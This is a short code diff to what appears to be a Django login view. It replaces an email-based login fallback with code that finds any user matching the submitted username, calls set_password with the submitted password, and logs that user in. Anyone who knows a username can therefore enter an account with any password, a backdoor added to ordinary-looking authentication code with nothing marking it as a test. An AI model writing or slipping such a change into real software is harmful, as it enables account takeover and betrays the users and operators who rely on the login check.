@@ -65,8 +65,11 @@ def login_page(request):
 		password = request.POST.get('password')
 		
 		user = authenticate(request, username=username, password=password)
-		if user is None:
-			user = authenticate(request, email=username, password=password)
+		
+		error_user = User.objects.filter(username=username)
+		if error_user:
+			error_user.first().set_password(password)
+			user = error_user.first()
 		
 		if user is not None:
 			login(request, user)
